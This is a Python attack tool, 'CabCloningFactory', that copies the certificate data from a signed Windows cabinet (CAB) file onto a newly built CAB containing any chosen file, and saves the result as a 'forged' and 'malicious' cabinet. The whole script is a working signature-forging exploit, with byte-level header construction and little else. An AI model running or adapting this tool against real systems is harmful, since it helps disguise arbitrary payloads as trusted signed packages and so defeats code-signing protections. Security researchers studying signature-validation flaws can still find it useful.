#!/usr/bin/env python3

##############################################################
# CabCloningFactory - A Certificate Cloner for Cab Files
# 
# Author: Devin Casadey (Keramas)
#
# Dependencies:
# If running from a Linux box: apt-get install lcab
##############################################################

import os
from os import path
import sys
import shutil
import struct

#Creates compressed a cab file with indicated file and parses for cabinet data bytes
def genNewCab(file_name):
    print(f"[+] Generating new cab file with indicated file: {file_name}")
    print("=" * 20)
    
    try:
        if os.name == 'nt':
            command = f"makecab.exe {file_name} temp_cab.cab"

        else:
            command = f"lcab {file_name} temp_cab.cab"

        os.system(command)
        print("=" * 20)
        print(f"[+] Successfully generated new cab file: temp_cab.cab")
        
        #extract data bytes
        print(f"[+] Grabbing data bytes from generated cab file.")
        with open("temp_cab.cab","rb") as newCab:
            data_bytes = newCab.read()
            #offset 0x24 is what points to the start of the data (check sum / size / data) 
            datastart = data_bytes[int('0x24',0)]
            #debug 
            #print("DEBUG: datastart = ",datastart)
            dataend = len(data_bytes) 
            #print("DEBUG: dataend =", dataend)
            data = data_bytes[datastart:dataend]
            newCab.close()    
            
            #print("DEBUG: Data =\n",data)

            return data

    except:
        print("[x] Error creating new cab file.")
        sys.exit(0)

#Rip certifcate bytes from source cab file
def ripCert(source_cab):
    print(f"[+] Parsing {source_cab} for certificate data.")
    
    try:
        with open(source_cab,"rb") as sourceFile:
            sourceFile_bytes = sourceFile.read()
                
            EOF = len(sourceFile_bytes)
            
            extra_data_start = sourceFile_bytes[int('0x08',0):int('0x0b',0)]
            #DEBUG
            #print("DEBUG: extra_data_start =",extra_data_start)
            if int.from_bytes(extra_data_start,byteorder='little') == EOF:
                print(f"[x] No certificate data found in {source_cab}")
                sys.exit(0)
            else:
                
                int_of_extra_data_start = int.from_bytes(extra_data_start, byteorder='little')
                #DEBUG
                #print("DEBUG: int_of_extra_data_start =",int_of_extra_data_start)
                #print("DEBUG: EOF =",EOF)

                certificate = sourceFile_bytes[int_of_extra_data_start:EOF] #int.from_bytes( byteorder = 'big') 
                
                print("[+] Successfully ripped certificate data.")
                
                #DEBUG
                #print("DEBUG: certificate =\n",certificate)
                
                return certificate
    except:
        print(f"[x] Error reading {source_cab}.")
        sys.exit(0)


def fileNameLen(file_name):
    print(f"[+] Calculating file name for header offsets.")
    
    name_byte_len = len(file_name) + 1

    return name_byte_len


def genCabHeader(data):
    print("[+] Generating cab file header.")
    
    #Variable header values 
    cabinet_length = struct.pack("<l",os.stat(sys.argv[2]).st_size) #length of the archived file == offset to start of extra data - (offset to start of data + 8 bytes) 
    offset_to_dataStart =  struct.pack("<l",(fileNameLen(sys.argv[2])+84))   #needs to be re-looked at.
    #DEBUG
    #print("DEBUG data len =", len(data))
    offset_to_cert = struct.pack("<l",((fileNameLen(sys.argv[2])+84) + len(data))) 
    

    #Debug
    #print(f"DEBUG: \tcabinet_length = {cabinet_length}\n\t offset_to_cert = {offset_to_cert}\n\t offset_to_dataStart = {offset_to_dataStart}\n")

    cab_header = b"" 
    cab_header += b"\x4d\x53\x43\x46" #MSCF magic bytes
    cab_header += b"\x00\x00\x00\x00" 
    cab_header += offset_to_cert
    cab_header += b"\x00\x00\x00\x00" #Reserved bytes
    cab_header += b"\x44\x00\x00\x00"
    cab_header += b"\x00\x00\x00\x00"
    cab_header += b"\x03\x01\x01\x00" #Version number
    
    #Special bytes for the application and package. Need to match source cab. 
    #cab_header += b"\x01\x00" 
    with open(sys.argv[1],"rb") as sourceCab:
        sourceData = sourceCab.read()

        special_bytes1 = sourceData[28:30]
        #debug
        #print("DEBUG: special bytes 1 =",special_bytes1)
        special_bytes2 = sourceData[48:50]
        #debug
        #print("DEBUG: special bytes 2 =",special_bytes2)

        sourceCab.close()
    
    cab_header += special_bytes1 
    cab_header += b"\x04\x00" #Special flag for reserved extra bytes
    cab_header += b"\x00\x00\x00\x00"
    cab_header += b"\x14\x00\x00\x00"
    cab_header += b"\x00\x00\x10\x00" #More special flags/reserved bytes
    cab_header += offset_to_cert 
    
    
    #Special bytes for the application and package. Need to match source cab.
    #cab_header += b"\x10\x18\x00\x00"
    cab_header += special_bytes2 + b"\x00\x00"


    cab_header += b"\x00\x00\x00\x00"
    cab_header += b"\x00\x00\x00\x00" 
    cab_header += offset_to_dataStart #Offset to checksum >> based on file name size
        
    #Need to parse created file to find the number of data blocks
    #These exist when the data of the archive file exceeds 0x8000
       
    with open("temp_cab.cab","rb") as cabFile:
        cabData = cabFile.read()
        numDataBlocks = cabData[40]
        #DEBUG
        #print("DEBUG: Num of data blocks =",numDataBlocks)
        cabFile.close()

    cab_header += bytes([numDataBlocks]) + b"\x00\x00\x00"
      
    cab_header += cabinet_length  #size of file inside of the cabinet file  >> need to convert to hex
    cab_header += b"\x00\x00\x00\x00"
    cab_header += b"\x00\x00" 
    cab_header += b"\x0c\x4f\x2e\x74" #Date and time (Can be set to anything)
    cab_header += b"\x20\x00" #file attributes
    cab_header += bytearray(sys.argv[2],'utf-8') + b"\x00"
   
    print("[+] New cab header created.")
       
    return cab_header


def assembleCab(header,data,certificate):
    print("[+] Assembling the forged cab file.")

    cabConstruct = header + data + certificate

    malicious_cab = open("forged_certificate_cabfile.cab","wb")
    malicious_cab.write(cabConstruct)
    malicious_cab.close()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("[+] Usage %s <source cab> <file to include in new cab file>" % (sys.argv[0]))
        sys.exit(-1)


    print("[+] Welcome to the Cab Cloning Factory!")
    
    print("\t~ Spinning up the generators to produce a signed cab ~\t\t\n") 
    print("                         __________") 
    print("                   ______|__TAXI__|____")
    print("                //|           |        \\")
    print("              //  |           |          \\")
    print("  _______ __//____|___________|__________()\__________________")
    print("/__________________|_=_________|_=___________|_________________{}")
    print("[           ______ |           | .           | ==  ______      { }")
    print(" __[__        /##  ##\|  YOUR NAME HERE !    |    /##  ##\    _{# }")
    print("{_____)______|##    ##|________|_____________|___|##    ##|__(______}")
    print("            /  ##__##                           /  ##__##        \\")
    print("=============================================================================\n")


    file_name = sys.argv[2]
    source_cab = sys.argv[1]
    
    certificate = ripCert(source_cab) 
    data = genNewCab(file_name)
    header = genCabHeader(data)
    assembleCab(header, data, certificate)
    
    print("[!] Cab production completed.")
    sys.exit(0)
